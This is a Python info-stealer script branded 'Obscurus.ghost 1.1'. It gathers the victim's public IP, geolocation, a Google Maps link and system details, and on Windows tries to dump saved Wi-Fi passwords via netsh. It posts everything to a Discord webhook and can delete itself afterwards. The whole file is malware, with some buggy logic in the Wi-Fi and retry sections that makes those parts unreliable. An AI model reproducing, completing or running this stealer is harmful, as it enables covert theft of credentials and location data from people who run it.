import requests
import os
import re
import sys
import datetime
import platform
import socket
import netifaces
import subprocess

from datetime import date

#customization of behavior
ip_log = True
general_log = True
self_destruct = False
retry_request =  True

#FINISHED
#log location and other info
if ip_log == True:
    req = requests.get("https://ipinfo.io/json")
    data = req.json()
    ip = data.get('ip')
    city = data.get('city')
    country = data.get('country')
    region = data.get('region')
    org = data.get('org')
    loc = data.get('loc')
    googlemap = "https://www.google.com/maps/search/google+map++" + loc
else:
    ip = ("Set: False")
    city = ("Set: False")
    country = ("Set: False")
    region = ("Set: False")
    org = ("Set: False")
    loc = ("Set: False")
    googlemap = ("Set: False")

#FINISHED, maybe add more stuff later
#general info

if general_log == True: 
    machine1 = platform.machine()
    version1 = platform.version()
    platform1 = platform.platform()
    uname1 = platform.uname()
    network_name = platform.node()
    python = platform.python_build()
    system1 = platform.system()
    process1 = platform.processor()
    computername = socket.gethostname()
    localipaddress = socket.gethostbyname(computername)
    date_of_extraction = date.today()
else:
    machine1 = ("set: False")
    version1 = ("set: False")
    platform1 = ("set: False")
    uname1 = ("set: False")
    network_name = ("set: False")
    python = ("set: False")
    system1 = ("set: False")
    process1 = ("set: False")
    computername = ("set: False")
    localipaddress = ("set: False")
    date_of_extraction = ("set: False")
    pass


#extract browser creds
#finish later

#extracting wifi passwords
#FINISHED just debug
if os != ("nt"):
    b = ('Unable to get wifi')
    pass
else: 
    if os == ("nt"):
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

#FINISHED
#the discord part

url='URL HERE'

data_to_discord = {
}

#whole embed
data_to_discord["embeds"] = [
                {
                    'author': {
                        'name': f'Obscurus.ghost 1.1 \\ {date_of_extraction}'
                    },
                    'description': f' @everyone Instance of Obscurus.ghost was ran, extracted data:',
                    'fields': [
                        {
                            'name': 'PC informations ',
                            'value': f'''

                            Version - {version1}
                            Platform - {platform1}
                            Username - {uname1}
                            Process- {process1}
                            Machine - {machine1}
                            ComputerName - {computername}
                            ExitNode = {network_name}
                            Python = {python}
                            OS - {system1}
                            
                            '''
                        },
                        {
                            'name': 'Network informations ',
                            'value': f'''

                            IP - {ip}
                            Local - {localipaddress}
                            

                            '''
                        },
                        {
                            'name': 'Location ',
                            'value': f'''

                            City - {city}
                            Country - {country}
                            Region - {region}
                            Org- {org}
                            Location - {loc}
                            {googlemap}
                            ''',
                        },
                        {  #i need to add some sort of function to ignore wifi variable when on linux, but i am too dumb to do that :D
                            'name': "Credentials",
                            'value':f''' 
                            {b}

                            ''',
                        }
                    ],
                    'footer': {
                        'text': '- Obscurus.ghost 1.1 \\ burnt.chipset@obscurus.network'
                    }
            }
]

result = requests.post(url, json = data_to_discord)

if retry_request == True:
    request_for_retry = (requests.post(url, json = data_to_discord))
    if result.status_code ==200:
        for x in request_for_retry:
            request_for_retry 
    else:
        pass
else: 
    pass
    

#SELF-DESTRUCT
if self_destruct == True:
    full_path = os.path.realpath(__file__)
    path, filename = os.path.split(full_path)
    os.remove(path + '/' + filename)
else: 
    pass



    

